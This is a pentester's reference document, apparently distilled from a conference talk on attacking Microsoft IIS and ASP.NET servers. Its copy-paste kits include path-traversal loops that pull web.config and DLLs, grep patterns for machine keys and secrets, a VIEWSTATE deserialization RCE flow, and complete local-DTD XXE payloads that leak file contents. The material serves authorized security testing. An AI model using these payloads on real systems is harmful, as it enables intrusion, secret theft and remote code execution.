# IIS Operator Notes — Hacking IIS (NahamCon / shubs · Assetnote)

**Source deck:** [Hacking IIS — NahamCon (35 slides)](https://www.slideshare.net/slideshow/hacking-iis-nahamconpdf/255244262)  
**Speaker:** shubs (@infosec_au) · Assetnote  
**Slide captures:** [`slides-raw/cdn/`](./slides-raw/cdn/) (1–35)  
**Authorized targets only.**

> **Engagement path:** use timed **[execution_batches/](./execution_batches/)** (1–2 h each).  
> This file is the **full reference / paste archive**, not the session board.

---

## How to use this doc under time pressure

| Goal | Go here |
|------|---------|
| Start a focused session | [execution_batches board](./README.md) |
| 30-second map of the whole talk | [Glance card](#0-glance-card--whole-talk-in-one-screen) |
| “HTTPAPI 2.0 / 404 — do I skip this IP?” | [§1 Host header rescue](#1-httpapi-20--host-header-rescue) |
| Internal app behind same IIS IP | [§2 VHost hopping](#2-vhost-hopping) |
| Any file download / path param | [§3 LFI → web.config → DLL](#3-local-file-disclosure--webconfig--dlls) |
| Have `machineKey` / VIEWSTATE | [§4 VIEWSTATE → RCE](#4-viewstate-deserialization--rce) |
| Third-party `.ashx` / vendor component | [§5 DNSpy dependencies](#5-targeting-dependencies-with-dnspy) |
| Blind XXE, DNS-only, stack traces on | [§6 Complex XXE](#6-complex-xxe-local-dtd--fragment-identifier) |
| Short names found (`FOOBAR~1`) | [§7 Shortname → logical fuzz](#7-shortname-enum--logical-fuzzing) |
| Full copy-paste kits | Each section’s **Paste kit** |

**Reading pattern per section:**

1. **Signal** — when you use this  
2. **Why** — one glance of first principles  
3. **Paste kit** — commands/payloads to run  
4. **Variations** — real-world time-box options  
5. **Done when** — stop criteria / next hop  

Replace `TARGET`, `IP`, `DOMAIN`, cookies, and paths with engagement values.

---

## 0. Glance card — whole talk in one screen

```text
IIS mental model
  Browser/IP ──Host header──► HTTP.sys / IIS ──routes──► site A | site B | internal app
       │                            │
       │                     short names (8.3)
       │                     path / MapPath LFI
       │                     VIEWSTATE + machineKey
       ▼
  Don’t skip: Server: Microsoft-HTTPAPI/2.0 + 404
       = often “wrong Host”, not “dead asset”
```

**shubs’s “why IIS is fun” checklist (tweet, slide 2):**

| Property | Operator takeaway |
|----------|-------------------|
| Case-insensitive FS | Content discovery: try `Admin`, `ADMIN`, mixed case once |
| IIS shortname (8.3) | Enumerate hidden dirs/files then complete names |
| VIEWSTATE + `machineKey` | Read `web.config` → forge VIEWSTATE → RCE |
| `web.config` upload tricks | Upload/write path → config abuse (separate playbook) |
| Debug / ELMAH / Trace | Stack traces + full paths; often left on |
| Telerik / vendor RCE | Known components on IIS = high ROI |

**Engagement kill-chain this deck teaches:**

```text
1) Rescue HTTPAPI assets (Host / VHost)
2) VHost hop to internal panels
3) LFI → web.config + bin/*.dll
4) machineKey → VIEWSTATE RCE
   OR reverse vendor DLLs (DNSpy)
   OR XXE with local DTD + fragment leak
5) Shortname hits → prefix-complete with ffuf/crunch
```

---

## 1. HTTPAPI 2.0 — Host header rescue

**Slides:** 3–7 · captures `slide-03` … `slide-07`

### Signal

```http
HTTP/1.1 404 Not Found
Server: Microsoft-HTTPAPI/2.0
```

Browser shows “HTTP Error 404. The requested resource is not found.” with **no real app chrome**.  
**Do not** mark the IP dead and move on.

### Why (first principles)

- **HTTP.sys** (kernel) accepts the TCP/TLS connection.
- **IIS** only routes to a site if **Host** (or SNI + Host) matches a binding.
- Wrong Host → HTTP.sys answers with the generic **HTTPAPI 2.0** 404.
- So: you often have a live IIS box; you’re missing the **name** that selects the site.

Two common recon gaps:

1. You only have the IP (no hostname / no cert SAN).  
2. Cert has a name, but DNS for that name doesn’t point at this IP (or is internal-only).

### Paste kit

**A. Confirm the signal**

```bash
# IP only
curl -skI --resolve anything:443:IP "https://IP/"
curl -skI "http://IP/"

# What you want to see / note:
#   Server: Microsoft-HTTPAPI/2.0
#   404 + empty/minimal body
```

**B. Harvest candidate hostnames**

```bash
# From TLS cert (when HTTPS answers)
echo | openssl s_client -connect IP:443 -servername IP 2>/dev/null \
  | openssl x509 -noout -text 2>/dev/null \
  | grep -E 'DNS:|Subject:'

# Or
nmap -p 443 --script ssl-cert IP

# From your recon corpus (amass, cert transparency, HTTP history, emails, JS)
# Keep a file hosts.candidates with one name per line
```

**C. Probe Host header (single name)**

```bash
# HTTPS with correct SNI + Host
curl -skI --resolve app.company.com:443:IP "https://app.company.com/"

# HTTP Host only
curl -sI -H "Host: app.company.com" "http://IP/"

# Compare body sizes / titles / Server header against bare IP
```

**D. Make tools behave (hosts file)**

```bash
# Temporary mapping so scanners use the real Host/SNI
echo "IP app.company.com" | sudo tee -a /etc/hosts

# Re-run enum WITH the hostname, not the IP
curl -skI "https://app.company.com/"
# shortscan / ffuf / nuclei / your IIS checklist — all against the name
```

**E. VHost brute when name is unknown**

```bash
# ffuf Host brute (HTTP)
ffuf -u "http://IP/" -H "Host: FUZZ.company.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc all -fs 0 -t 50 -o vhost-ffuf.json

# Filter: hide the default HTTPAPI body size
# First capture baseline length:
curl -sk -o /tmp/base -w "%{size_download}\n" -H "Host: no-such-xyz.company.com" "http://IP/"
# Then:
ffuf -u "http://IP/" -H "Host: FUZZ.company.com" \
  -w wordlist.txt -mc all -fs BASELINE_SIZE -t 50
```

```bash
# gobuster vhost (if preferred)
gobuster vhost -u "http://IP" -w wordlist.txt --append-domain -d company.com
```

### Variations (time-boxed)

| Time | Do this |
|------|---------|
| 2 min | Cert SAN + 5 obvious Hosts (`www`, company apex, product name) |
| 10 min | Top 5k subdomain list vs Host; keep any size/title change |
| 30 min | Full sub wordlist + alt roots (`corp.`, `internal.`, `admin.`) + HTTPS SNI brute |
| Stuck | Same workflow on **every** HTTPAPI 2.0 IP in scope (rinse/repeat) |

### Done when

- [ ] You get a **different** status/body/`Server: Microsoft-IIS/*` / ASP.NET cookies  
- [ ] `/etc/hosts` or Burp/Caido upstream Host is set  
- [ ] You re-ran shortname + content discovery on the **named** host  
- [ ] Other HTTPAPI assets in the program got the same pass  

**Next hop:** §2 if other Hosts respond · §7 shortnames · normal app testing.

---

## 2. VHost hopping

**Slides:** 8–12 · captures `slide-08` … `slide-12`

### Signal

- One public hostname works (e.g. `apply.company.com` on IIS).
- Same IP might host **other** IIS sites bound only to internal names.
- Classic win from talk: `mssql.company.com` **not** in public DNS, but answers when Host is set on the public IP → MSSQL manager panel (~$1900 in talk).

### Why (first principles)

IIS **site bindings** are often:

| Binding | Meaning |
|---------|---------|
| `*:80:apply.company.com` | Public app |
| `*:80:mssql.company.com` | Internal admin — DNS may not publish it |

The TCP path is the same. **Only the Host header** (and sometimes SNI) selects the app.  
**VHost hopping** = speak a Host that public DNS never gave you, over a host/IP you *can* reach.

### Paste kit

**A. Discover hidden Hosts (from a working site)**

```bash
# Use the working public site as base URL; only Host changes
ffuf -u "https://apply.company.com/" \
  -H "Host: FUZZ.company.com" \
  -w large-subdomains.txt \
  -mc all -t 40 \
  -fs BASELINE_SIZE

# HTTP variant
ffuf -u "http://IP/" -H "Host: FUZZ.company.com" \
  -w large-subdomains.txt -mc all -fs BASELINE_SIZE
```

**B. Burp Match & Replace (browser UX for the internal name)**

Talk’s rule (adapt names):

| Field | Value |
|-------|--------|
| Type | Request header |
| Match (regex) | `^Host: apply\.company\.com$` |
| Replace | `Host: mssql.company.com` |
| Regex match | ✓ |
| Comment | Rewrite Host for VHost hop |

**Caido / mitmproxy equivalent idea:** rewrite `Host` (and keep original SNI or pin IP — if TLS breaks, use `--resolve` / hosts file + cert issues awareness).

```bash
# CLI pin without DNS
curl -sk --resolve mssql.company.com:443:IP "https://mssql.company.com/"
```

**C. After hop succeeds**

```bash
# Treat as new app: map surface, auth, default creds, known product CVEs
# Talk example product: ASP Enterprise Manager / MSSQL web manager
# https://sourceforge.net/projects/asp-ent-man/
```

### Variations

| Situation | Variation |
|-----------|-----------|
| TLS certificate errors | Use hosts file + ignore verify for recon only; or HTTP :80 bindings |
| WAF on public Host only | Hopped Host may **bypass** WAF rules tied to hostname |
| Same response for all Hosts | Not multi-site, or front door normalizes Host — try raw IP + HTTP |
| Need speed | Wordlist = CT logs + corp wordlist + `mssql,db,sql,admin,intranet,dev,staging,api,git,jenkins` first |
| ARR / reverse proxy in front | Proxy may strip unknown Hosts — try both edge IP and origin IP if in scope |

### Done when

- [ ] Documented Hosts that change response size/title/auth  
- [ ] Browser or proxy can stably reach the hopped app  
- [ ] New app entered into scope notes / checklist  

**Next hop:** product-specific bugs · §3 if file features · §5 if vendor paths.

---

## 3. Local file disclosure → web.config → DLLs

**Slides:** 13–15 · captures `slide-13` … `slide-15`

### Signal

Any parameter that becomes a **filesystem path** on ASP.NET/IIS:

- `fileName`, `file`, `path`, `doc`, `template`, `download`, `url` (file:// sometimes)  
- Handlers: download, export, PDF/Excel generate, attachment  

Talk pattern (vulnerable shape):

```csharp
// Server.MapPath + user string + FileStream → classic LFI
string path = HttpContext.Current.Server.MapPath("~/Content/PDF/" + fileName);
FileStream fileStream = new FileStream(path, FileMode.Open);
// returned as attachment/octet-stream
```

### Why (first principles)

1. **`Server.MapPath`** turns a virtual path into a physical path under the site.  
2. If user input is concatenated **without** canonicalization / allowlist, `../` walks the tree.  
3. On ASP.NET Framework apps, gold files are:

| File | Why |
|------|-----|
| `web.config` | Connection strings, `machineKey`, custom errors, handlers |
| `global.asax` | App wiring clues |
| `bin/*.dll` | **Compiled app** — reverse with DNSpy; also namespaces in config |

**Rule of thumb from talk:** if you can read `web.config` on IIS/ASP.NET, you can **often** reach RCE via VIEWSTATE (`machineKey`) — see §4.

Reference (talk): *From Path Traversal to Source Code in ASP.NET MVC* — Minded Security · `https://bit.ly/36D3WQg`

### Paste kit

**A. Prove LFI (path traversal variants — try in order)**

```http
GET /v1/DownloadCategoryExcel?fileName=../../web.config HTTP/1.1
Host: TARGET
```

```bash
# Curl form — adjust path/param
BASE="https://TARGET/v1/DownloadCategoryExcel"

for p in \
  '../../web.config' \
  '..%2f..%2fweb.config' \
  '....//....//web.config' \
  '..\..\web.config' \
  '..%5c..%5cweb.config' \
  '/web.config' \
  'C:\inetpub\wwwroot\web.config' \
  'C:/inetpub/wwwroot/web.config'
do
  echo "=== $p ==="
  curl -sk -G "$BASE" --data-urlencode "fileName=$p" -D- -o "/tmp/lfi-out" | head -20
  file /tmp/lfi-out; head -c 200 /tmp/lfi-out; echo
done
```

**B. Escalate to source / binaries (talk sequence)**

```text
1) ../../web.config          → keys, namespaces, connectionStrings
2) ../../global.asax         → application type hints
3) Find: <add namespace="Company.Web.Api" />  (or assembly names)
4) ../../bin/Company.Web.Api.dll
5) Repeat for every assembly under bin/ / mentioned in config
```

```bash
# After you know assembly name from web.config
curl -sk -G "$BASE" --data-urlencode "fileName=../../bin/Company.Web.Api.dll" -o Company.Web.Api.dll
file Company.Web.Api.dll   # should be PE32 / PE32+
```

**C. Mine `web.config` quickly**

```bash
# Once downloaded
grep -iE 'machineKey|connectionString|password|validationKey|decryptionKey|apiKey|AWS|secret' web.config
```

### Variations

| Constraint | Try |
|------------|-----|
| `../` filtered | `..\` , `%2e%2e%2f`, double encode `%252e%252e%252f`, `..;/` (proxy vs IIS) |
| Extension appended | `web.config%00.pdf` (legacy), `web.config/.`, trailing space/dot quirks |
| Root unknown | `../../../../../../inetpub/wwwroot/web.config` |
| Nested apps | `../web.config` vs `../../web.config` (child app vs site root) |
| Only partial read | Still enough for keys sometimes — combine with §6 XXE partial leak |
| No LFI but upload | Different chain (`web.config` upload) — not this deck’s focus |

### Done when

- [ ] `web.config` (or fragment) in loot  
- [ ] `machineKey` extracted **or** DLLs saved for DNSpy  
- [ ] Secrets ticketed / not committed to git  

**Next hop:** §4 if `machineKey` · §5 if vendor/DLL analysis · report if high-impact read only.

---

## 4. VIEWSTATE deserialization → RCE

**Slides:** 16–17 · captures `slide-16` … `slide-17`

### Signal

- ASP.NET WebForms (or any page emitting `__VIEWSTATE`)  
- You have **`validationKey`** + **`decryptionKey`** (and alg) from `web.config`  
- Or debug/error pages expose machine key material (rare)

Talk thesis: **read `web.config` ⇒ often RCE** on IIS/ASP.NET via VIEWSTATE.

Research pointers from slide:

- Pwnie-nominated writeup: `https://bit.ly/2MzJ1qI`  
- White paper: `https://bit.ly/2NDZc73`  
- Tool: [viewgen](https://github.com/0xacb/viewgen)

### Why (first principles)

```text
Browser sends __VIEWSTATE (signed/encrypted blob)
        │
        ▼
ObjectStateFormatter deserializes .NET objects
        │
        ▼
If you can forge a valid MAC (and decrypt if needed)
using machineKey from web.config
        │
        ▼
Gadget chain → OS command / callback  (RCE)
```

- **`validationKey`**: HMAC integrity of VIEWSTATE.  
- **`decryptionKey`**: encryption when `viewStateEncryptionMode` requires it.  
- Without the keys, forging dies. **With** the keys, you speak the app’s language.

### Paste kit

**A. Extract keys from web.config**

```xml
<!-- Example shape — copy real values from loot -->
<machineKey
  validationKey="HEX..."
  decryptionKey="HEX..."
  validation="SHA1"
  decryption="AES" />
```

```bash
grep -i machineKey web.config
```

**B. Confirm VIEWSTATE present**

```bash
curl -sk "https://TARGET/SomePage.aspx" | grep -o '__VIEWSTATE' | head
# Also note __VIEWSTATEGENERATOR if present (needed by some generators)
```

**C. Generate payload (viewgen — check repo for current CLI)**

```bash
# Install per upstream README (example flow — verify flags on the tool version you install)
git clone https://github.com/0xacb/viewgen.git
cd viewgen && # follow README / pip install

# Conceptual usage pattern (adjust to tool’s --help):
# viewgen --validationkey KEY --decryptionkey KEY \
#   --validationalg SHA1 --decryptionalg AES \
#   -g COMMAND_OR_GADGET
```

**Also common in the ecosystem (know both):**

| Tool | Notes |
|------|--------|
| [viewgen](https://github.com/0xacb/viewgen) | Cited in talk |
| [ysoserial.net](https://github.com/pwntester/ysoserial.net) | Classic gadget generator for .NET |
| Blacklist3r / AspDotNetWrapper | Key / VIEWSTATE helpers in some writeups |

**D. Send forged VIEWSTATE**

```http
POST /VulnerablePage.aspx HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

__VIEWSTATE=FORGED&__VIEWSTATEGENERATOR=XXXX&__EVENTVALIDATION=...
```

```bash
# Minimal check: response time, out-of-band DNS/HTTP, or safe `ping`/`curl` to collab box
# Prefer OOB in engagements when command echo is blind
```

### Variations

| Reality | Adaptation |
|---------|------------|
| Encryption on | Need both keys + correct `decryption` alg |
| MAC only | validationKey + alg may suffice |
| `.NET Core` / minimal APIs | Often **no** classic VIEWSTATE — chain differs |
| Load-balanced different keys | Payload works on one node only — pin sticky session |
| WAF strips huge VIEWSTATE | Chunk/alternate endpoint, or smaller gadget |
| No RCE gadgets allowed in scope | Stop at “forgeable VIEWSTATE” PoC with benign marker if policy requires |

### Done when

- [ ] Controlled execution or solid signed-blob proof per program rules  
- [ ] Keys handled as secrets (not pasted into public tickets raw if policy says so)  

**Next hop:** persist carefully · lateral · report.

---

## 5. Targeting dependencies with DNSpy

**Slides:** 18–22 · captures `slide-18` … `slide-22`

### Signal

- Paths that scream **third-party** ASP.NET components, e.g.  
  `/admin/cutesoft_client/cuteeditor/uploader.ashx`  
- You can download the **same product** (or pulled `bin/*.dll` via LFI).  
- No source in the zip — only DLLs.

### Why (first principles)

- IIS apps often ship **old commercial editors, uploaders, handlers**.  
- Vendors distribute **binaries**; bugs hide in handlers (upload, image, file).  
- **DNSpy** decompiles .NET IL → C# so you hunt like you have source:  
  sinks = `File.Write`, `Process.Start`, `XmlDocument.Load`, deserializers, path concat.

Talk example: CuteSoft editor zip from vendor site → DLLs → DNSpy → vulns.

### Paste kit

**A. Fingerprint vendor paths (quick hits)**

```bash
# Seed list — extend from your content discovery
ffuf -u "https://TARGET/FUZZ" -w - -mc all -fc 404 -t 30 <<'EOF'
admin/cutesoft_client/cuteeditor/uploader.ashx
CuteSoft_Client/CuteEditor/Load.ashx
ScriptResource.axd
WebResource.axd
Telerik.Web.UI.WebResource.axd
devtools.axd
elmah.axd
trace.axd
EOF
```

**B. Acquire binaries**

```bash
# Prefer: LFI to ../../bin/Vendor.Component.dll
# Or: download matching product version from vendor (lab/research)
# Or: authenticated static path if misconfigured
```

**C. DNSpy workflow**

```text
1) https://github.com/dnSpy/dnSpy/releases  (Windows GUI; use lab VM)
2) File → Open → Vendor.dll (and dependencies)
3) Export project / read decompiled C#
4) Search: Upload, SaveAs, FileName, MapPath, Xml, Deserialize, Process
5) Map HTTP entrypoints (.ashx/.aspx) → dangerous methods
6) Build minimal PoC request against TARGET
```

```bash
# Linux-friendly decompile alternatives when DNSpy GUI unavailable
# (still validate findings the same way)
ilspycmd -p -o out/ Vendor.dll
# or: dotnet tool / monodis / ildasm depending on lab
```

### Variations

| Time | Approach |
|------|----------|
| 15 min | Google `CVE <product> IIS` + version from headers/js |
| 1 hr | DNSpy only the uploader/handler DLL |
| Deep | Full dependency tree + compare to public advisories |

### Done when

- [ ] Request → vulnerable method mapped  
- [ ] Impact shown (upload path, RCE, SSRF, etc.) with evidence  

**Next hop:** exploit safely · §3 if upload writes under web root.

---

## 6. Complex XXE — local DTD + fragment identifier

**Slides:** 23–28 · captures `slide-23` … `slide-28`

### Signal

- Endpoint parses XML (`Content-Type: text/xml` / `application/xml`, SOAP, office XML, SAML-ish).  
- Constraints like the talk:

  - **No outbound HTTP** (OOB XXE fails)  
  - **DNS may work** (limited)  
  - **Entity result not reflected** in body  
  - **External DTD unreachable**  
  - **Stack traces ON** (errors leak paths / parse detail)

Payload bank (talk): `https://bit.ly/3cF8pWs`  
Local DTD idea: `https://bit.ly/2LjXoyM`  
Fragment-identifier leak credit: **@nytr0gen_** (Robert Vulpe)

### Why (first principles)

Classic XXE needs either:

1. **Reflect** file contents in the response, or  
2. **Exfil** via external HTTP/FTP/DNS.

When both are blocked, you abuse:

1. **Local DTD** on disk (Windows has system DTDs) that you can **redefine** a parameter entity inside.  
2. Force a **parse error** whose message includes file bytes.  
3. On .NET, putting file contents in a **URL fragment** (`#...`) of a failing `file://` URI can yield **partial file contents in the exception** (fragment identifier trick).

```text
Local DTD on disk
   → redefine parameter entity
   → read file into entity
   → trigger error with file data in fragment
   → stack trace prints partial contents
```

### Paste kit

**Attempt 1 — local DTD error leak (baseline)**

Use a known Windows local DTD path; read a small file first (`system.ini`).

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///C:/Windows/System32/wbem/xml/cim20.dtd">
  <!ENTITY % SuperClass '>
    <!ENTITY &#x25; file SYSTEM "file:///c:/windows/system.ini">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<message>any text</message>
```

```bash
curl -sk "https://TARGET/xml-endpoint" \
  -H "Content-Type: application/xml" \
  --data-binary @payload-attempt1.xml
# Expect: stack trace; may error on EntityName without data (talk “No Love”)
```

**Attempt 2 — fragment identifier (`#`) for partial contents**

Talk’s working idea: put `%file;` after `#` so contents become a **fragment** in the error path.

```xml
<?xml version="1.0" ?>
<!DOCTYPE doc [
  <!ENTITY % local_dtd SYSTEM "file:///C:/Windows/System32/wbem/xml/cim20.dtd">
  <!ENTITY % SuperClass '>
    <!ENTITY &#x25; file SYSTEM "file:///D:/webserv2/services/web.config">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/#&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    <!ENTITY test "test">
  '>
  %local_dtd;
]>
<xxx>test</xxx>
```

```bash
# Adapt: drive letter + path to web.config from errors or shortnames
# Goal response: XmlException / path error containing partial web.config bytes
```

**Windows local DTD candidates to try if `cim20.dtd` missing**

```text
file:///C:/Windows/System32/wbem/xml/cim20.dtd
file:///C:/Windows/System32/wbem/XML/cim20.dtd
# Other research lists exist for local DTDs on Windows — rotate if 1 fails
```

### Variations

| Constraint | Variation |
|------------|-----------|
| No stack traces | Try DNS OOB only; or stop and note “blocked” |
| Linux host | Different local DTDs (`/usr/share/xml/...`) — not this deck’s focus |
| Partial leak only | Reassemble secrets across multiple reads / offsets if possible |
| WAF blocks `<!ENTITY` | Encoding, UTF-16, SOAP wrapper, multipart |
| Need speed | Jump straight to Attempt 2 with `web.config` path guesses from §7 |

### Done when

- [ ] Any local file bytes in error (even partial `web.config`)  
- [ ] Keys/secrets reconstructed or impact documented  

**Next hop:** §4 with leaked `machineKey` · expand file reads.

---

## 7. Shortname enum → logical fuzzing

**Slides:** 29–33 · captures `slide-29` … `slide-33`

### Signal

```text
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
```

Shortscan (or IIS-ShortName-Scanner) reports **Vulnerable: Yes** and lines like:

```text
ASPNET~1   → ASPNET_CLIENT
LIDSDI~1   LIDSDI?
LIDSSE~1   LIDSSE?
LIDSTE~1   LIDSTE?
EASYFI~1   EASYFI?
```

### Why (first principles)

- Windows **8.3 short names**: `VERYLONGNAME` → `VERYLO~1`.  
- Older IIS can be probed so **short names leak** even when full names 404.  
- You rarely get the **full** name from shortname alone when the suffix is ambiguous (`LIDSDI?`).  
- **Logical fuzzing** = treat the known prefix as fixed, fuzz the **rest**:

```text
LIDSDI~1  ⇒  known "LIDSDI" + unknown tail
ffuf:  /lidsFUZZ   with wordlist of completions
       + extensions asp,aspx,ashx,asmx,html,...
```

### Paste kit

**A. Detect + enumerate**

```bash
# bitquark shortscan (talk)
go install github.com/bitquark/shortscan/cmd/shortscan@latest
shortscan "https://TARGET/"
# or:
go run cmd/shortscan/main.go "https://TARGET/"

# Alternative: irsdl IIS-ShortName-Scanner
# java -jar iis_shortname_scanner.jar 0 5 https://TARGET/
```

**B. Build completion attacks from output**

| Short name | Stable prefix for ffuf | Example URL pattern |
|------------|------------------------|---------------------|
| `LIDSDI~1` | `lids` | `https://TARGET/lidsFUZZ` |
| `LIDSSE~1` | `lids` | same list, different hits |
| `EASYFI~1` | `easy` | `https://TARGET/easyFUZZ` |

Talk commands:

```bash
# Completions wordlist — language dictionary, project terms, seclists
ffuf -w final_wordlist.txt -D \
  -e asp,aspx,ashx,asmx \
  -t 100 \
  -c \
  -u "https://TARGET/lidsFUZZ"

# Case variants matter less on IIS (case-insensitive) but tools may still differ
```

**C. Brute tiny unknown suffixes (talk crunch)**

When prefix is long and only 1–3 chars remain:

```bash
crunch 0 3 abcdefghijklmnopqrstuvwxyz0123456789 -o 3chars.txt
# Combine: knownprefix + 3chars + extensions via ffuf -e or wordlist gen
ffuf -w 3chars.txt -e aspx,ashx,asp,asmx,html \
  -u "https://TARGET/lidsdiFUZZ"
```

Helper link from talk: `https://bit.ly/3q2yFwY` (shortname-related tooling/notes — verify live).

**D. Priority targets once full names resolve**

```text
*admin*  *backup*  *upload*  *config*  *api*  *service*
*.zip *.bak *.old  web.config*  *.aspx  *.ashx
```

### Variations

| Situation | Variation |
|-----------|-----------|
| Not vulnerable | Don’t waste time — move on |
| WAF rate-limits | Drop threads (`-t 10`), jitter, authenticated session |
| Only dirs (`ASPNET_CLIENT`) | Crawl known ASP.NET folder junk for leftovers |
| Time-box 10 min | shortscan + manual guess of top 20 completions |
| Time-box 1 hr | shortscan + prefix ffuf + crunch for high-value prefixes only |

### Done when

- [ ] Shortname report saved  
- [ ] At least high-value prefixes completed or ruled out  
- [ ] New paths fed into §3–§6 / normal testing  

---

## 8. Engagement micro-playbooks (copy order)

### Playbook A — New IIS IP, unknown name (15–45 min)

```text
1. curl -skI http://IP/ and https://IP/
2. If HTTPAPI 2.0 → §1 (cert SAN + Host brute)
3. hosts file / --resolve → shortscan (§7)
4. Content discovery on real hostname
5. Note ASP.NET cookies / .aspx / VIEWSTATE for later
```

### Playbook B — Working IIS app, hunt internals (30–90 min)

```text
1. §2 VHost hop with corporate wordlist
2. Diff responses; open any admin/db panels carefully
3. §7 shortnames on each Host that is “real IIS”
4. Grep JS/HTML for .ashx / vendor paths → §5
```

### Playbook C — File/download feature found (20–60 min)

```text
1. §3 traversal to web.config
2. Pull machineKey → §4
3. Pull bin DLLs → §5
4. If XML upload/import exists → §6 in parallel
```

### Playbook D — Blind XML parser (20–40 min)

```text
1. Confirm XML parsed (benign well-formed vs malformed)
2. §6 Attempt 1 on system.ini
3. §6 Attempt 2 on web.config paths
4. Feed keys to §4
```

---

## 9. Quick reference — tools

| Tool | Role |
|------|------|
| `curl` + `--resolve` / `-H Host:` | Host header / SNI truth |
| `ffuf` | VHost brute + logical shortname completion |
| `shortscan` / IIS-ShortName-Scanner | 8.3 disclosure |
| `openssl s_client` / `nmap ssl-cert` | Host candidates from certs |
| Burp Match&Replace | Stable VHost hop while browsing |
| [viewgen](https://github.com/0xacb/viewgen) / ysoserial.net | VIEWSTATE RCE |
| [DNSpy](https://github.com/dnSpy/dnSpy) | Reverse vendor/app DLLs |
| `crunch` | Tiny suffix brute after shortname prefix |
| `grep` on `web.config` | Keys & secrets triage |

---

## 10. Resources (from slide 34 + stable companions)

| Link | What |
|------|------|
| https://bit.ly/3uzOP4N | Assetnote YouTube |
| https://youtu.be/HrJW6Y9kHC4 | Hacking IIS Part 1 |
| https://youtu.be/_4W0WXUatiw | Hacking IIS Part 2 |
| http://soroush.secproject.com/blog/ | Soroush Dalili — IIS/ASP.NET depth |
| https://twitter.com/bitquark | shortscan author |
| https://twitter.com/nytr0gen_ | XXE fragment-identifier partial leak |
| https://bit.ly/36D3WQg | Path traversal → source (Minded Security) |
| https://bit.ly/2MzJ1qI / https://bit.ly/2NDZc73 | VIEWSTATE research |
| https://bit.ly/3cF8pWs | XXE payload notes |
| https://bit.ly/2LjXoyM | XXE with local DTD files |
| https://github.com/0xacb/viewgen | VIEWSTATE generator |
| https://github.com/dnSpy/dnSpy | .NET decompiler |
| https://github.com/bitquark/shortscan | Shortname scanner |
| https://github.com/irsdl/IIS-ShortName-Scanner | Classic shortname scanner |

Local index: [resources.md](./resources.md) · checklist: [pentest-checklist.md](./pentest-checklist.md)

---

## 11. Slide → section map (35)

| Slides | Topic | Section |
|--------|--------|---------|
| 1 | Title — Hacking IIS w/ shubs | — |
| 2 | Why IIS (tweet checklist) | §0 |
| 3–7 | HTTPAPI 2.0 / Host header | §1 |
| 8–12 | VHost hopping | §2 |
| 13–15 | LFI → web.config → DLL | §3 |
| 16–17 | VIEWSTATE RCE | §4 |
| 18–22 | DNSpy / dependencies | §5 |
| 23–28 | Complex XXE | §6 |
| 29–33 | Shortname logical fuzz | §7 |
| 34 | Resources | §10 |
| 35 | assetnote.io | — |

Clean images: `slides-raw/cdn/slide-01.jpg` … `slide-35.jpg`.

---

## 12. Safety / hygiene

- Only in-scope hosts and methods allowed by the program.  
- VHost hopping may reach **sensitive internal** apps — treat data carefully.  
- Never commit `web.config`, machine keys, or live flags to git.  
- Prefer OOB / low-impact proofs before noisy RCE.  
- Rate-limit shortname and Host brutes against production.

---

*Operator notes distilled from the NahamCon “Hacking IIS” deck (shubs / Assetnote) for just-in-time engagement use — copy, understand, adapt.*
